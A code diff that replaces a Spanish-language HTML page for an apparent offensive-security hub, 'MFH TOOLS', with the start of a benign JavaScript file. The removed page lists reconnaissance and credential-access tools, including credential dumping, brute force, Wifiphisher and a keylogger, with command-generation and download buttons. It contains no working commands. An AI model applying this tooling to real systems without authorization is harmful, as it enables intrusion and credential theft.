@@ -1,933 +1,1027 @@
-<!DOCTYPE html>
-<html lang="es-MX">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#0a0a0a">
-    <meta name="description" content="MFH TOOLS - Herramientas de Ciberseguridad. Reconocimiento y Acceso con Credenciales.">
-    <title>🔥 MFH TOOLS - Herramientas de Ciberseguridad</title>
-    
-    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
-    <link rel="manifest" href="site.webmanifest">
-    
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
-            color: #e0e0e0;
-            transition: all 0.3s ease;
-        }
-        body.light-mode {
-            background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
-            color: #1a1a1a;
-        }
-        body.light-mode .navbar { background: rgba(255,255,255,0.95); border-bottom: 1px solid rgba(0,0,0,0.1); }
-        body.light-mode .tool-card { background: rgba(255,255,255,0.95); border-color: rgba(0,0,0,0.1); }
-        body.light-mode .console-output { background: #fff; border-color: #00aa00; color: #1a1a1a; }
-        body.light-mode .badge-mfh { background: rgba(0,170,0,0.1); color: #008800; }
-        body.light-mode footer { background: rgba(255,255,255,0.95); border-top-color: rgba(0,0,0,0.1); }
-        body.light-mode .form-control { background: #fff; color: #1a1a1a; border-color: #ccc; }
-        body.light-mode .category-header { background: rgba(0,170,0,0.08); border-color: rgba(0,170,0,0.3); }
-        
-        .navbar {
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(0,255,0,0.3);
-            position: fixed;
-            width: 100%;
-            top: 0;
-            z-index: 1000;
-            padding: 8px 0;
-        }
-        .navbar-brand {
-            font-weight: 800;
-            font-size: 1.4rem;
-            background: linear-gradient(135deg, #00ff00, #00cc00);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .navbar .nav-link { color: #e0e0e0 !important; font-size: 0.85rem; transition: all 0.3s ease; }
-        .navbar .nav-link:hover { color: #00ff00 !important; }
-        .navbar .nav-link.active { color: #00ff00 !important; border-bottom: 2px solid #00ff00; }
-        .theme-toggle { cursor: pointer; font-size: 1.2rem; transition: all 0.3s ease; }
-        .theme-toggle:hover { transform: rotate(180deg); }
-        
-        .tool-card {
-            background: rgba(20,20,20,0.95);
-            border: 1px solid rgba(0,255,0,0.15);
-            border-radius: 12px;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            overflow: hidden;
-            height: 100%;
-        }
-        .tool-card:hover {
-            transform: translateY(-5px);
-            border-color: #00ff00;
-            box-shadow: 0 10px 25px rgba(0,255,0,0.15);
-        }
-        .tool-icon { font-size: 1.8rem; color: #00ff00; transition: all 0.3s ease; }
-        .tool-card:hover .tool-icon { transform: rotate(360deg) scale(1.1); }
-        
-        .console-output {
-            background: #0a0a0a;
-            border: 2px solid #00ff00;
-            border-radius: 10px;
-            font-family: 'Courier New', monospace;
-            padding: 12px;
-            height: 300px;
-            overflow-y: auto;
-            font-size: 0.8rem;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-        .console-output::-webkit-scrollbar { width: 5px; }
-        .console-output::-webkit-scrollbar-track { background: #1a1a1a; }
-        .console-output::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 3px; }
-        
-        .btn-mfh {
-            background: linear-gradient(135deg, #00ff00, #00cc00);
-            border: none;
-            color: #000;
-            font-weight: 600;
-            padding: 6px 15px;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-        .btn-mfh:hover { transform: scale(1.02); box-shadow: 0 0 12px rgba(0,255,0,0.4); }
-        .btn-outline-mfh {
-            background: transparent;
-            border: 2px solid #00ff00;
-            color: #00ff00;
-            font-weight: 600;
-            padding: 5px 12px;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-        .btn-outline-mfh:hover { background: #00ff00; color: #000; }
-        
-        .badge-mfh {
-            background: rgba(0,255,0,0.15);
-            color: #00ff00;
-            border: 1px solid rgba(0,255,0,0.3);
-            padding: 3px 8px;
-            border-radius: 15px;
-            font-size: 0.7rem;
-        }
-        
-        .nav-tabs { border-bottom: none; gap: 3px; flex-wrap: wrap; }
-        .nav-tabs .nav-link {
-            color: #e0e0e0;
-            border: none;
-            border-radius: 8px;
-            padding: 6px 12px;
-            font-size: 0.8rem;
-            transition: all 0.3s ease;
-        }
-        .nav-tabs .nav-link:hover { color: #00ff00; background: rgba(0,255,0,0.1); }
-        .nav-tabs .nav-link.active {
-            color: #00ff00;
-            background: rgba(0,255,0,0.15);
-            border-bottom: 2px solid #00ff00;
-        }
-        body.light-mode .nav-tabs .nav-link { color: #333; }
-        body.light-mode .nav-tabs .nav-link.active { color: #00aa00; background: rgba(0,170,0,0.1); }
-        
-        .form-control, .form-select {
-            background: #0a0a0a;
-            border: 1px solid rgba(0,255,0,0.3);
-            color: #e0e0e0;
-            border-radius: 8px;
-            font-size: 0.85rem;
-        }
-        .form-control:focus, .form-select:focus {
-            border-color: #00ff00;
-            box-shadow: 0 0 8px rgba(0,255,0,0.3);
-            outline: none;
-        }
-        body.light-mode .form-control, body.light-mode .form-select {
-            background: #fff;
-            color: #1a1a1a;
-            border-color: #ccc;
-        }
-        
-        .category-section { margin-bottom: 40px; }
-        .category-header {
-            background: rgba(0,255,0,0.08);
-            border: 2px solid rgba(0,255,0,0.3);
-            border-radius: 10px;
-            padding: 15px 20px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .category-header h3 {
-            color: #00ff00;
-            margin: 0;
-            font-size: 1.5rem;
-            font-weight: 700;
-        }
-        .category-header .category-icon { font-size: 2rem; color: #00ff00; }
-        .category-header .category-count {
-            margin-left: auto;
-            background: rgba(0,255,0,0.2);
-            color: #00ff00;
-            padding: 4px 12px;
-            border-radius: 15px;
-            font-size: 0.8rem;
-            font-weight: 600;
-        }
-        
-        footer { background: rgba(0,0,0,0.95); border-top: 1px solid rgba(0,255,0,0.2); padding: 20px 0 15px; margin-top: 30px; }
-        footer a { color: #e0e0e0; text-decoration: none; font-size: 0.85rem; transition: all 0.3s ease; }
-        footer a:hover { color: #00ff00; }
-        
-        @keyframes glow {
-            0%,100% { text-shadow: 0 0 5px rgba(0,255,0,0.5); }
-            50% { text-shadow: 0 0 15px rgba(0,255,0,0.8); }
-        }
-        .glow-text { animation: glow 2s ease-in-out infinite; }
-        
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .tool-card { animation: fadeInUp 0.5s ease-out; }
-        
-        @media (max-width: 768px) {
-            .navbar-brand { font-size: 1rem; }
-            .nav-tabs .nav-link { padding: 4px 8px; font-size: 0.7rem; }
-            .btn-mfh { padding: 4px 10px; font-size: 0.75rem; }
-            .console-output { height: 220px; font-size: 0.7rem; }
-            .category-header h3 { font-size: 1.1rem; }
-            .category-header .category-icon { font-size: 1.5rem; }
-        }
-    </style>
-</head>
-<body>
+/**
+ * MFH TOOLS - Script del apartado Herramientas de Ciberseguridad
+ * Categorias: Reconocimiento | Acceso con Credenciales
+ * ASCII plano - sin Unicode
+ */
 
-<!-- ==================== NAVBAR ==================== -->
-<nav class="navbar navbar-expand-lg">
-    <div class="container">
-        <a class="navbar-brand" href="index.html"><i class="fas fa-shield-haltered me-2"></i>MFH TOOLS</a>
-        <div class="ms-auto d-flex align-items-center gap-2">
-            <a href="index.html" class="btn btn-sm btn-outline-mfh"><i class="fas fa-arrow-left me-1"></i>Volver</a>
-            <i class="fas fa-sun theme-toggle" id="themeToggle"></i>
-        </div>
-    </div>
-</nav>
+'use strict';
 
-<!-- ==================== HERO ==================== -->
-<section id="inicio" class="pt-5 mt-5">
-    <div class="container pt-3">
-        <div class="text-center">
-            <h1 class="display-4 fw-bold glow-text"><i class="fas fa-skull me-2"></i>🔥 MFH TOOLS</h1>
-            <p class="lead text-success">Herramientas de Ciberseguridad</p>
-            <div class="d-flex gap-2 flex-wrap justify-content-center mb-3">
-                <span class="badge-mfh"><i class="fas fa-search me-1"></i> Reconocimiento</span>
-                <span class="badge-mfh"><i class="fas fa-unlock-alt me-1"></i> Acceso con Credenciales</span>
-                <span class="badge-mfh"><i class="fas fa-flag me-1"></i> México</span>
-            </div>
-        </div>
-    </div>
-</section>
+// ============================================================
+// TEMA
+// ============================================================
+(function() {
+    var themeToggle = document.getElementById('themeToggle');
+    var body = document.body;
+    if (!themeToggle || !body) return;
 
-<!-- ==================== GRID DE CATEGORÍAS ==================== -->
-<section id="categorias" class="py-3">
-    <div class="container">
+    if (localStorage.getItem('theme') === 'light') {
+        body.classList.add('light-mode');
+        themeToggle.classList.remove('fa-sun');
+        themeToggle.classList.add('fa-moon');
+    }
 
-        <!-- ========== CATEGORÍA 1: RECONOCIMIENTO ========== -->
-        <div class="category-section">
-            <div class="category-header">
-                <span class="category-icon">🔍</span>
-                <h3>Reconocimiento</h3>
-                <span class="category-count">10 herramientas</span>
-            </div>
-            <div class="row g-3">
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('host')">
-                        <i class="fas fa-server tool-icon"></i>
-                        <div class="mt-2 fw-bold">🔍 Host Information</div>
-                        <small class="text-muted">Info del host</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('identity')">
-                        <i class="fas fa-user-secret tool-icon"></i>
-                        <div class="mt-2 fw-bold">👤 Identity Information</div>
-                        <small class="text-muted">Info de identidad</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('network')">
-                        <i class="fas fa-network-wired tool-icon"></i>
-                        <div class="mt-2 fw-bold">🌐 Network Information</div>
-                        <small class="text-muted">Info de red</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('dns')">
-                        <i class="fas fa-globe tool-icon"></i>
-                        <div class="mt-2 fw-bold">📡 DNS Information</div>
-                        <small class="text-muted">Info DNS</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('webscan')">
-                        <i class="fas fa-globe tool-icon"></i>
-                        <div class="mt-2 fw-bold">🌐 Web Scanning</div>
-                        <small class="text-muted">DIRB, DirBuster, Gobuster</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('vulnscan')">
-                        <i class="fas fa-shield-alt tool-icon"></i>
-                        <div class="mt-2 fw-bold">🛡️ Vulnerability Scanning</div>
-                        <small class="text-muted">Nmap, Zenmap</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('webvuln')">
-                        <i class="fas fa-bug tool-icon"></i>
-                        <div class="mt-2 fw-bold">🔒 Web Vulnerability</div>
-                        <small class="text-muted">Nikto, ZAP</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('bluetooth')">
-                        <i class="fas fa-bluetooth tool-icon"></i>
-                        <div class="mt-2 fw-bold">📶 Bluetooth Scanning</div>
-                        <small class="text-muted">Bettercap, BlueZ, hcitool</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('radio')">
-                        <i class="fas fa-broadcast-tower tool-icon"></i>
-                        <div class="mt-2 fw-bold">📻 Radio Frequency</div>
-                        <small class="text-muted">HackRF, GNU Radio, RTL-SDR</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('wifi')">
-                        <i class="fas fa-wifi tool-icon"></i>
-                        <div class="mt-2 fw-bold">📡 WiFi Scanning</div>
-                        <small class="text-muted">Bettercap, Kismet, Sparrow</small>
-                    </div>
-                </div>
-            </div>
-        </div>
+    themeToggle.addEventListener('click', function() {
+        body.classList.toggle('light-mode');
+        var isLight = body.classList.contains('light-mode');
+        localStorage.setItem('theme', isLight ? 'light' : 'dark');
+        if (isLight) {
+            themeToggle.classList.remove('fa-sun');
+            themeToggle.classList.add('fa-moon');
+        } else {
+            themeToggle.classList.remove('fa-moon');
+            themeToggle.classList.add('fa-sun');
+        }
+    });
+})();
 
-        <!-- ========== CATEGORÍA 2: ACCESO CON CREDENCIALES ========== -->
-        <div class="category-section">
-            <div class="category-header">
-                <span class="category-icon">🔐</span>
-                <h3>Acceso con Credenciales</h3>
-                <span class="category-count">9 herramientas</span>
-            </div>
-            <div class="row g-3">
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('creddump')">
-                        <i class="fas fa-unlock-alt tool-icon"></i>
-                        <div class="mt-2 fw-bold">🔐 Credential Dumping</div>
-                        <small class="text-muted">SAM, LSA, secretsdump</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('hashid')">
-                        <i class="fas fa-hashtag tool-icon"></i>
-                        <div class="mt-2 fw-bold">#️⃣ Hash Identification</div>
-                        <small class="text-muted">hashid, hash-identifier</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('wordlist')">
-                        <i class="fas fa-list tool-icon"></i>
-                        <div class="mt-2 fw-bold">📝 Password Profiling</div>
-                        <small class="text-muted">CeWL, Crunch, RSMangler</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('bruteforce')">
-                        <i class="fas fa-hammer tool-icon"></i>
-                        <div class="mt-2 fw-bold">🔨 Brute Force</div>
-                        <small class="text-muted">Hydra, Medusa, NetExec</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('passcrack')">
-                        <i class="fas fa-key tool-icon"></i>
-                        <div class="mt-2 fw-bold">🔓 Password Cracking</div>
-                        <small class="text-muted">Hashcat, John, fcrackzip</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('unsecured')">
-                        <i class="fas fa-folder-open tool-icon"></i>
-                        <div class="mt-2 fw-bold">📂 Unsecured Credentials</div>
-                        <small class="text-muted">SSH, Cloud, History</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('wificred')">
-                        <i class="fas fa-wifi tool-icon"></i>
-                        <div class="mt-2 fw-bold">📶 WiFi Credential Access</div>
-                        <small class="text-muted">Aircrack-ng, Wifiphisher</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('keylogger')">
-                        <i class="fas fa-keyboard tool-icon"></i>
-                        <div class="mt-2 fw-bold">⌨️ Keylogger</div>
-                        <small class="text-muted">xspy (X11)</small>
-                    </div>
-                </div>
-                <div class="col-md-3 col-6">
-                    <div class="tool-card p-3 text-center" onclick="showTool('voip')">
-                        <i class="fas fa-phone tool-icon"></i>
-                        <div class="mt-2 fw-bold">📞 VoIP Credential Access</div>
-                        <small class="text-muted">svcrack, enumiax</small>
-                    </div>
-                </div>
-            </div>
-        </div>
+// ============================================================
+// UTILIDADES
+// ============================================================
+function $(id) { return document.getElementById(id); }
 
-    </div>
-</section>
+function setOutput(id, html) {
+    var el = document.getElementById(id);
+    if (el) el.innerHTML = html;
+}
 
-<!-- ==================== PANEL DE HERRAMIENTAS ==================== -->
-<section id="herramientas" class="py-3">
-    <div class="container">
-        <div class="tool-card p-3">
-            <h4 class="text-center mb-3"><i class="fas fa-cogs me-2"></i>Panel de Herramientas</h4>
-            
-            <ul class="nav nav-tabs justify-content-center mb-3 flex-wrap" id="mainTab" role="tablist">
-                <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#hostTab"><i class="fas fa-server me-1"></i> Host</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#identityTab"><i class="fas fa-user-secret me-1"></i> Identity</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#networkTab"><i class="fas fa-network-wired me-1"></i> Network</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#dnsTab"><i class="fas fa-globe me-1"></i> DNS</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#webscanTab"><i class="fas fa-globe me-1"></i> Web Scan</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#vulnscanTab"><i class="fas fa-shield-alt me-1"></i> Vuln Scan</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#webvulnTab"><i class="fas fa-bug me-1"></i> Web Vuln</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#bluetoothTab"><i class="fas fa-bluetooth me-1"></i> Bluetooth</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#radioTab"><i class="fas fa-broadcast-tower me-1"></i> Radio</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#wifiTab"><i class="fas fa-wifi me-1"></i> WiFi</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#creddumpTab"><i class="fas fa-unlock-alt me-1"></i> Credential</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#hashidTab"><i class="fas fa-hashtag me-1"></i> Hash ID</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#wordlistTab"><i class="fas fa-list me-1"></i> Wordlist</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#bruteforceTab"><i class="fas fa-hammer me-1"></i> Brute</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#passcrackTab"><i class="fas fa-key me-1"></i> Crack</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#unsecuredTab"><i class="fas fa-folder-open me-1"></i> Unsecured</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#wificredTab"><i class="fas fa-wifi me-1"></i> WiFi Cred</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#keyloggerTab"><i class="fas fa-keyboard me-1"></i> Keylogger</button></li>
-                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#voipTab"><i class="fas fa-phone me-1"></i> VoIP</button></li>
-            </ul>
-            
-            <div class="tab-content">
-                
-                <!-- ====== HOST ====== -->
-                <div class="tab-pane fade show active" id="hostTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🎯 Dominio o IP</label>
-                            <input type="text" class="form-control" id="hostTarget" placeholder="ejemplo.com o 8.8.8.8" value="google.com">
-                            <button class="btn-mfh mt-2 w-100" onclick="runHostInfo()"><i class="fas fa-play me-2"></i>Analizar</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('host-information.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="hostResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== IDENTITY ====== -->
-                <div class="tab-pane fade" id="identityTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">👤 Email o Usuario</label>
-                            <input type="text" class="form-control" id="identityTarget" placeholder="usuario@dominio.com" value="test@example.com">
-                            <button class="btn-mfh mt-2 w-100" onclick="runIdentityInfo()"><i class="fas fa-play me-2"></i>Analizar</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('identity-information.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="identityResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== NETWORK ====== -->
-                <div class="tab-pane fade" id="networkTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🌐 IP o Rango CIDR</label>
-                            <input type="text" class="form-control" id="networkTarget" placeholder="192.168.1.1" value="8.8.8.8">
-                            <button class="btn-mfh mt-2 w-100" onclick="runNetworkInfo()"><i class="fas fa-play me-2"></i>Analizar</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('network-information.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="networkResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== DNS ====== -->
-                <div class="tab-pane fade" id="dnsTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📡 Dominio</label>
-                            <input type="text" class="form-control" id="dnsTarget" placeholder="ejemplo.com" value="google.com">
-                            <label class="form-label mt-2">Tipo de registro</label>
-                            <select class="form-select" id="dnsType">
-                                <option value="A">A</option>
-                                <option value="AAAA">AAAA</option>
-                                <option value="MX">MX</option>
-                                <option value="NS">NS</option>
-                                <option value="TXT">TXT</option>
-                                <option value="CNAME">CNAME</option>
-                                <option value="SOA">SOA</option>
-                                <option value="ALL">Todos</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runDnsInfo()"><i class="fas fa-play me-2"></i>Consultar</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('dns-information.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="dnsResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== WEB SCANNING ====== -->
-                <div class="tab-pane fade" id="webscanTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🌐 URL objetivo</label>
-                            <input type="text" class="form-control" id="webscanTarget" placeholder="https://ejemplo.com" value="https://example.com">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="webscanTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="dirb">DIRB</option>
-                                <option value="dirbuster">DirBuster</option>
-                                <option value="gobuster">Gobuster</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runWebScanning()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('web-scanning.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="webscanResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== VULNERABILITY SCANNING ====== -->
-                <div class="tab-pane fade" id="vulnscanTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🎯 IP o Host</label>
-                            <input type="text" class="form-control" id="vulnscanTarget" placeholder="192.168.1.1" value="scanme.nmap.org">
-                            <label class="form-label mt-2">🔧 Tipo de escaneo</label>
-                            <select class="form-select" id="vulnscanType">
-                                <option value="all">Todos los comandos</option>
-                                <option value="basic">Básico (nmap -sT)</option>
-                                <option value="stealth">SYN Stealth (nmap -sS)</option>
-                                <option value="version">Versiones (nmap -sV -sC)</option>
-                                <option value="os">Detección SO (nmap -O)</option>
-                                <option value="vuln">Vulnerabilidades NSE</option>
-                                <option value="allports">Todos los puertos</option>
-                                <option value="udp">UDP (top 100)</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runVulnScanning()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('vulnerability-scanning.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="vulnscanResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== WEB VULNERABILITY SCANNING ====== -->
-                <div class="tab-pane fade" id="webvulnTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🌐 URL objetivo</label>
-                            <input type="text" class="form-control" id="webvulnTarget" placeholder="https://ejemplo.com" value="https://testphp.vulnweb.com">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="webvulnTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="nikto">Nikto</option>
-                                <option value="zap">OWASP ZAP</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runWebVulnScanning()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('web-vulnerability-scanning.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="webvulnResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== BLUETOOTH SCANNING ====== -->
-                <div class="tab-pane fade" id="bluetoothTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📶 MAC objetivo (o "all")</label>
-                            <input type="text" class="form-control" id="bluetoothTarget" placeholder="AA:BB:CC:DD:EE:FF" value="all">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="bluetoothTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="bettercap">Bettercap</option>
-                                <option value="bluetoothctl">bluetoothctl</option>
-                                <option value="hcitool">hcitool</option>
-                                <option value="btmon">btmon</option>
-                                <option value="bluelog">Bluelog</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runBluetoothScanning()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('bluetooth-scanning.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="bluetoothResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== RADIO FREQUENCY ====== -->
-                <div class="tab-pane fade" id="radioTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📻 Frecuencia (Hz, opcional)</label>
-                            <input type="text" class="form-control" id="radioFreq" placeholder="100000000" value="100000000">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="radioTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="hackrf">HackRF</option>
-                                <option value="gnurdio">GNU Radio</option>
-                                <option value="rtlsdr">RTL-SDR</option>
-                                <option value="gqrx">GQRX</option>
-                                <option value="sdr-sharp">SDR#</option>
-                                <option value="universal-radio-hacker">URH</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runRadioScanning()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('radio-frequency-scanning.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="radioResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== WIFI SCANNING ====== -->
-                <div class="tab-pane fade" id="wifiTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📡 Interface WiFi</label>
-                            <input type="text" class="form-control" id="wifiIface" placeholder="wlan0" value="wlan0">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="wifiTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="bettercap">Bettercap</option>
-                                <option value="sparrow-wifi">Sparrow-WiFi</option>
-                                <option value="kismet">Kismet</option>
-                                <option value="airodump">Airodump-ng</option>
-                                <option value="airoplay">Aireplay-ng</option>
-                                <option value="wifite">Wifite</option>
-                                <option value="wash">Wash</option>
-                                <option value="reaver">Reaver</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runWifiScanning()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('wifi-scanning.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="wifiResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== CREDENTIAL DUMPING ====== -->
-                <div class="tab-pane fade" id="creddumpTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🔐 Ruta de hives (o "local")</label>
-                            <input type="text" class="form-control" id="creddumpTarget" placeholder="/mnt/win o local" value="/mnt/win">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="creddumpTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="samdump2">samdump2</option>
